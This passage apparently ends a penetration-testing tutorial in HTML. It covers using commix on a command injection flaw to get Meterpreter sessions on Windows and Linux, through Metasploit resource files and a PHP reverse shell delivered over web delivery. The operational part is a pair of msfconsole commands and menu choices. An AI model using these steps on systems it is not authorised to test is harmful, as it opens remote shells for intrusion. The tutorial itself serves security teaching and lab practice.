+<pre class="lang:default decode:true">msfconsole -r /usr/share/commix/php_meterpreter.rc</pre>
+<p>&nbsp;As the above command is executed, you will have&nbsp;your&nbsp;session as shown in the image below :</p>
+<p><img src="https://4.bp.blogspot.com/-8-rwAhCxWG8/XHP6Gh5xd9I/AAAAAAAAdAI/KlOINE6NtLUD3cYdrvToJEXOmj20fQQawCLcBGAs/s1600/15.png" alt="" /></p>
+<p>The other method we will use to exploit&nbsp;Linux&nbsp;is by using web delivery. Repeat the above steps similarly,&nbsp;but&nbsp;instead of choosing option 8, this time choose option 11 for web delivery. And then choose option 2 for a PHP reverse shell.</p>
+<p><img src="https://2.bp.blogspot.com/-xP9xTfnMc0s/XHP6HPM0rVI/AAAAAAAAdAQ/Ui4DvBJhSV8Y-wDu9QhiQjAz0pdCPgI3gCLcBGAs/s1600/16.png" alt="" /></p>
+<p>Executing the above steps will create a resource file yet again. Run the command given in the new terminal window :</p>
+<pre class="lang:default decode:true">msfconsole -r /usr/share/commix/web_delivery.rc</pre>
+<p><img src="https://1.bp.blogspot.com/-4gTmyEdUMho/XHP6HN9W2PI/AAAAAAAAdAM/CKMietIw0B8zYsN0CoIM_CG9g_86EoiHQCLcBGAs/s1600/17.png" alt="" /></p>
+<p>Running the above command will give&nbsp;you your&nbsp;session as shown in the above image. This is&nbsp;how&nbsp;you can gain a meterpreter session through command injection vulnerability using commix. The session can be acquired in both Windows and&nbsp;Linux&nbsp;platforms.</p>
+</div>
+</div>
+</body>
+</html>
